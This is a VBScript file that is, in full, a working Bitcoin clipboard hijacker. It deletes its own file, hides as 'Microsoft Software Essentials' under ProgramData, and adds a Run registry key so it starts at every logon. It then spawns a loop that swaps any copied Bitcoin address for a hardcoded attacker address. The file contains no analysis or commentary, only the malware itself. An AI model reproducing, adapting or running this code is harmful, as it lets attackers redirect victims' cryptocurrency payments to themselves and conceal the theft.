Set objWSH = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.DeleteFile(wscript.ScriptFullName)
On Error Resume Next

MyBTCAddress = "16kTgpux2489MN7YXoyqbtQMiMa3SWDogw"

BTCFolder = objWSH.ExpandEnvironmentStrings("%PROGRAMDATA%") & "\Microsoft Essentials"
BTC = BTCFolder & "\Software Essentials.vbs"
RegKeyName = "Microsoft Software Essentials"

If Not objFSO.Folderexists(BTCFolder) then
objFSO.CreateFolder BTCFolder
End If
Const HKEY_CURRENT_USER = &H80000001
strComputer = "."
Set objRegistry = GetObject("winmgmts:\\" & strComputer & "\root\default:StdRegProv")
objRegistry.SetStringValue HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", RegKeyName, chr(34) & BTC & chr(34)

Sub CreateBTCs
    Set FileBTC = objFSO.CreateTextFile(BTC, True)
    FileBTC.WriteLine "On Error Resume Next"
    FileBTC.WriteLine "Set objHTML = CreateObject(" & chr(34) & "HTMLfile" & chr(34) & ")"
    FileBTC.WriteLine "Set objWSH = CreateObject(" & chr(34) & "WScript.Shell" & chr(34) & ")"
    FileBTC.WriteLine "Do"
    FileBTC.WriteLine "wscript.sleep(500)"
    FileBTC.WriteLine "Clipboard = objHTML.ParentWindow.ClipboardData.GetData(" & chr(34) & "text" & chr(34) & ")"
    FileBTC.WriteLine "LengthofClipboard = Len(Clipboard)"
    FileBTC.WriteLine "If Left(Clipboard,1) = " & chr(34) & "1" & chr(34) & " then"
    FileBTC.WriteLine "If LengthofClipboard >= 26 and LengthofClipboard <= 35 then"
    FileBTC.WriteLine "objWSH.run " & chr(34) & "C:\Windows\System32\cmd.exe /c echo " & MyBTCAddress & "| clip" & chr(34) & ", 0"
    FileBTC.WriteLine "End If"
    FileBTC.WriteLine "End If"
    FileBTC.WriteLine "If Left(Clipboard,1) = " & chr(34) & "3" & chr(34) & " then"
    FileBTC.WriteLine "If LengthofClipboard >= 26 and LengthofClipboard <= 35 then"
    FileBTC.WriteLine "objWSH.run " & chr(34) & "C:\Windows\System32\cmd.exe /c echo " & MyBTCAddress & "| clip" & chr(34) & ", 0"
    FileBTC.WriteLine "End If"
    FileBTC.WriteLine "End If"
    FileBTC.WriteLine "Loop"
    FileBTC.Close
End Sub

CreateBTCs

objWSH.run chr(34) & BTC & chr(34)
